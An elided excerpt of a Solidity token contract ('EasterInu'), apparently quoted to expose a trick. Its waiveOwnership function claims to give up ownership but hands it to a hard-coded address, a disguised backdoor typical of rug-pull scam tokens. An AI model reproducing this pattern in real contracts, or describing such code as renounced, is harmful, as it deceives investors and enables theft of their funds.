...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3238079687eB6470143d4b001B298191661F1d12));
        _owner = address(0x3238079687eB6470143d4b001B298191661F1d12);
    }
...
contract EasterInu is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x41c5AC525d44372faa858b8Bc2693bA07f39AdfB);
    address payable public teamWalletAddress = payable(0x807f72265dfeFC8718e7a9dB21B9020eB9E10FA9);
